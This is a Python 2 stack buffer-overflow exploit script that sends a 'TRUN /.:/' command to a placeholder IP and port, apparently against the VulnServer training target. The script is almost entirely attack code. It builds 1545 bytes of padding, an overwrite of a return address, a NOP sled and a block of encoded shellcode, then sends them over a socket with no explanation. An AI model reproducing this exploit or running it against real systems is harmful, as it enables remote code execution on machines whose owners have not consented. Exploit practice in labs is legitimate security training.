#!/usr/bin/python
import sys, socket


overflow = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"                                                                                                        
"\x84\xf6\x45\x84\x83\xee\xfc\xe2\xf4\x78\x1e\xc7\x84\x84\xf6"                                                                                                        
"\x25\x0d\x61\xc7\x85\xe0\x0f\xa6\x75\x0f\xd6\xfa\xce\xd6\x90"                                                                                                        
"\x7d\x37\xac\x8b\x41\x0f\xa2\xb5\x09\xe9\xb8\xe5\x8a\x47\xa8"                                                                                                        
"\xa4\x37\x8a\x89\x85\x31\xa7\x76\xd6\xa1\xce\xd6\x94\x7d\x0f"                                                                                                        
"\xb8\x0f\xba\x54\xfc\x67\xbe\x44\x55\xd5\x7d\x1c\xa4\x85\x25"                                                                                                        
"\xce\xcd\x9c\x15\x7f\xcd\x0f\xc2\xce\x85\x52\xc7\xba\x28\x45"                                                                                                        
"\x39\x48\x85\x43\xce\xa5\xf1\x72\xf5\x38\x7c\xbf\x8b\x61\xf1"                                                                                                        
"\x60\xae\xce\xdc\xa0\xf7\x96\xe2\x0f\xfa\x0e\x0f\xdc\xea\x44"                                                                                                        
"\x57\x0f\xf2\xce\x85\x54\x7f\x01\xa0\xa0\xad\x1e\xe5\xdd\xac"                                                                                                        
"\x14\x7b\x64\xa9\x1a\xde\x0f\xe4\xae\x09\xd9\x9e\x76\xb6\x84"                                                                                                        
"\xf6\x2d\xf3\xf7\xc4\x1a\xd0\xec\xba\x32\xa2\x83\x09\x90\x3c"                                                                                                        
"\x14\xf7\x45\x84\xad\x32\x11\xd4\xec\xdf\xc5\xef\x84\x09\x90"                                                                                                        
"\xd4\xd4\xa6\x15\xc4\xd4\xb6\x15\xec\x6e\xf9\x9a\x64\x7b\x23"                                                                                                        
"\xd2\xee\x81\x9e\x85\x2c\x97\xef\x2d\x86\x84\xf7\xfe\x0d\x62"                                                                                                        
"\x9c\x55\xd2\xd3\x9e\xdc\x21\xf0\x97\xba\x51\x01\x36\x31\x88"                                                                                                        
"\x7b\xb8\x4d\xf1\x68\x9e\xb5\x31\x26\xa0\xba\x51\xec\x95\x28"                                                                                                        
"\xe0\x84\x7f\xa6\xd3\xd3\xa1\x74\x72\xee\xe4\x1c\xd2\x66\x0b"
"\x23\x43\xc0\xd2\x79\x85\x85\x7b\x01\xa0\x94\x30\x45\xc0\xd0"
"\xa6\x13\xd2\xd2\xb0\x13\xca\xd2\xa0\x16\xd2\xec\x8f\x89\xbb"
"\x02\x09\x90\x0d\x64\xb8\x13\xc2\x7b\xc6\x2d\x8c\x03\xeb\x25"
"\x7b\x51\x4d\xa5\x99\xae\xfc\x2d\x22\x11\x4b\xd8\x7b\x51\xca"
"\x43\xf8\x8e\x76\xbe\x64\xf1\xf3\xfe\xc3\x97\x84\x2a\xee\x84"
"\xa5\xba\x51")

shellcode = "A" * 1545 + "\x83\x66\x52\x56" + "\x90" * 16 + overflow

#nops (padding bytes) = \x90 *  32

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('<ip>',<port>))

	s.send(('TRUN /.:/ ' + shellcode))
	s.close

except:
	print "Error connecting to server!"
	sys.exit ()
